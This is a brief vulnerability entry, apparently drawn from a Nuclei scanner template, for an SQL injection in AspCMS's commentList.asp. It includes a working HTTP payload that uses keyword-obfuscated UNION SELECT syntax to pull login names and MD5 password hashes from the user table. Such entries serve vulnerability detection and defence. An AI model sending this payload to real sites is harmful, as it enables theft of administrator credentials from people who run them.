# Vulnerability: AspCMS commentList.asp - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`aspcms-commentlist-sqli.yaml`)

## Description
An SQL injection vulnerability has been identified in the commentList.asp file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire the administrator's MD5 password.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
```

